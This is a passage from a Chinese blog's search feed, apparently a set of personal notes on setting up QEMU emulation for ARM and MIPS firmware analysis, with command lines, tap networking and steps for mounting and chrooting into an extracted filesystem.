alt="image-20241013123928704"></p><h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><h3 id="蓝牙模块"><a href="#蓝牙模块" class="headerlink" title="蓝牙模块"></a>蓝牙模块</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131239331.png" alt="image-20241012215226266"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131239321.png" alt="image-20241013123954270"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>物联网挖掘实战</title>
      <link href="/2024/10/24/%E7%89%A9%E8%81%94%E7%BD%91%E6%8C%96%E6%8E%98%E5%AE%9E%E6%88%98/"/>
      <url>/2024/10/24/%E7%89%A9%E8%81%94%E7%BD%91%E6%8C%96%E6%8E%98%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<h1 id="QEMU"><a href="#QEMU" class="headerlink" title="QEMU"></a>QEMU</h1><h2 id="系统仿真（qemu-system）"><a href="#系统仿真（qemu-system）" class="headerlink" title="系统仿真（qemu-system）"></a>系统仿真（qemu-system）</h2><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-arm \</span><br><span class="line">  -M vexpress-a9 \</span><br><span class="line">  -kernel vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">  -initrd initrd.img-3.2.0-4-vexpress \</span><br><span class="line">  -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">  -append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot; \</span><br><span class="line">  -net nic \</span><br><span class="line">  -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">  -nographic</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">模拟不同架构的虚拟机</span></span><br><span class="line">qemu-system-xxxx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定虚拟机机器类型</span></span><br><span class="line">-M malta # MIPS架构机器类型</span><br><span class="line">-M vexpress-a9 # ARM架构机器类型</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定要加载的内核镜像文件</span></span><br><span class="line">-kernel vmlinuz-3.2.0-4-vexpress</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定虚拟机硬盘</span></span><br><span class="line">-hda</span><br><span class="line">-dribe # 更灵活，可以指定虚拟硬盘属性</span><br><span class="line">-drive file=xxx.qcow2,if=sd,format=qcow2</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定初始 RAM 磁盘（initramfs 或 initrd）映像文件,看映像中有没有</span></span><br><span class="line">-initrd initrd.img-3.2.0-4-vexpress</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">向内核传递命令行参数，root指定根文件系统的位置，console指定控制台输出位置</span></span><br><span class="line">-append &quot;root=/dev/sda1 console=tyy0&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/dev/sda1指的是第一个 SCSI 或 SATA 磁盘的第一个分区，tyy0表示第一个虚拟终端设备</span></span><br><span class="line">-append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/dev/mmcblk0p2表示第一个多媒体卡（MMC）或 SD 卡的块设备的第二个分区，ttyAMA0，表示第一个 ARM 串行设备，用于显示内核和系统启动过程的输出。</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置虚拟网络接口的选项</span></span><br><span class="line">-net nic # 创建一个虚拟网络接口，使得虚拟机能够与外部网络或其他虚拟机通信。</span><br><span class="line">-net tap,ifname=tap0 # 创建一个 TAP 网络接口，并使用指定的接口名称tap0与虚拟机连接。</span><br></pre></td></tr></table></figure><h3 id="镜像下载网址"><a href="#镜像下载网址" class="headerlink" title="镜像下载网址"></a>镜像下载网址</h3><p><a href="https://people.debian.org/~aurel32/qemu/">Index of &#x2F;~aurel32&#x2F;qemu</a></p><h3 id="各种架构的调试命令"><a href="#各种架构的调试命令" class="headerlink" title="各种架构的调试命令"></a>各种架构的调试命令</h3><p><strong>aarch64</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-aarch64 \</span><br><span class="line">-m 1024 \</span><br><span class="line">-cpu cortex-a57 \</span><br><span class="line">-M virt \</span><br><span class="line">-nographic \</span><br><span class="line">-smp 4 \</span><br><span class="line">-kernel linux-4.14.221/arch/arm64/boot/Image \</span><br><span class="line">-append &quot;noinintrd sched_debug root=/dev/vda rootfstype=ext4 rw crashkernel=256M loglevel=8&quot; \</span><br><span class="line">-drive if=none,file=linux_rootfs.ext4,id=hd0 \</span><br><span class="line">-device virtio-blk-device,drive=hd0</span><br></pre></td></tr></table></figure><p><strong>armhf</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-arm \</span><br><span class="line">-M vexpress-a9 \</span><br><span class="line">-kernel vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">-initrd initrd.img-3.2.0-4-vexpress \</span><br><span class="line">-drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">-append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot; \</span><br><span class="line">-net nic \</span><br><span class="line">-net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">-nographic</span><br></pre></td></tr></table></figure><p><strong>armel</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-arm \</span><br><span class="line"> -M versatilepb \</span><br><span class="line"> -kernel vmlinuz-3.2.0-4-versatile \</span><br><span class="line"> -initrd initrd.img-3.2.0-4-versatile \</span><br><span class="line"> -hda debian_wheezy_armel_standard.qcow2 \</span><br><span class="line"> -append root=/dev/sda1 \</span><br><span class="line"> -net nic \</span><br><span class="line"> -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line"> -nographi</span><br></pre></td></tr></table></figure><p><strong>mip_32</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mips \</span><br><span class="line"> -M malta \</span><br><span class="line"> -kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line"> -hda debian_wheezy_mips_standard.qcow2 \</span><br><span class="line"> -append &quot;root=/dev/sda1 console=tty0&quot; \</span><br><span class="line"> -net nic \</span><br><span class="line"> -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line"> -nographic</span><br></pre></td></tr></table></figure><p><strong>mipsel_32</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mipsel \</span><br><span class="line">-M malta \</span><br><span class="line">-kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">-hda debian_wheezy_mipsel_standard.qcow2 \</span><br><span class="line">-append &quot;root=/dev/sda1 console=tty0&quot; \</span><br><span class="line">-net nic \</span><br><span class="line">-net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">-nographic</span><br></pre></td></tr></table></figure><p><strong>mipsel_64</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mips64el \</span><br><span class="line"> -M malta \</span><br><span class="line"> -kernel vmlinux-3.2.0-4-5kc-malta \</span><br><span class="line"> -hda debian_wheezy_mipsel_standard.qcow2 \</span><br><span class="line"> -append &quot;root=/dev/sda1 console=tty0&quot; \</span><br><span class="line"> -net nic \</span><br><span class="line"> -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line"> -nographic</span><br></pre></td></tr></table></figure><h3 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h3><h4 id="虚拟网卡连接"><a href="#虚拟网卡连接" class="headerlink" title="虚拟网卡连接"></a>虚拟网卡连接</h4><p>虚拟机</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo tunctl -t tap0 -u `whoami`  # 为了与 QEMU 虚拟机通信，添加一个虚拟网卡</span><br><span class="line">sudo ifconfig tap0 10.10.10.1/24 # 为添加的虚拟网卡配置 IP 地址</span><br></pre></td></tr></table></figure><p>qemu</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 10.10.10.2/24</span><br><span class="line">ping -c 3 10.10.10.1 # 测下网</span><br></pre></td></tr></table></figure><h4 id="启动qemu"><a href="#启动qemu" class="headerlink" title="启动qemu"></a>启动qemu</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-arm \</span><br><span class="line">-M vexpress-a9 \</span><br><span class="line">-kernel vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">-initrd initrd.img-3.2.0-4-vexpress \</span><br><span class="line">-drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">-append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot; \</span><br><span class="line">-net nic \</span><br><span class="line">-net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">-nographic</span><br></pre></td></tr></table></figure><h4 id="文件系统传入"><a href="#文件系统传入" class="headerlink" title="文件系统传入"></a>文件系统传入</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar zcvf 1.tar squashfs-root</span><br><span class="line">sudo scp -r 1.tar root@10.10.10.2:/root/</span><br></pre></td></tr></table></figure><h4 id="文件系统挂载"><a href="#文件系统挂载" class="headerlink" title="文件系统挂载"></a>文件系统挂载</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"> # </span><span class="language-bash">然后挂载文件系统</span></span><br><span class="line">mount -o bind /dev ./squashfs-root/dev/</span><br><span class="line"><span class="meta prompt_"> # </span><span class="language-bash">mount -t sys /sys/ ./squashfs-root/sys/</span></span><br><span class="line"> mount -t proc /proc/ ./squashfs-root/proc/</span><br><span class="line"> chroot ./squashfs-root sh</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
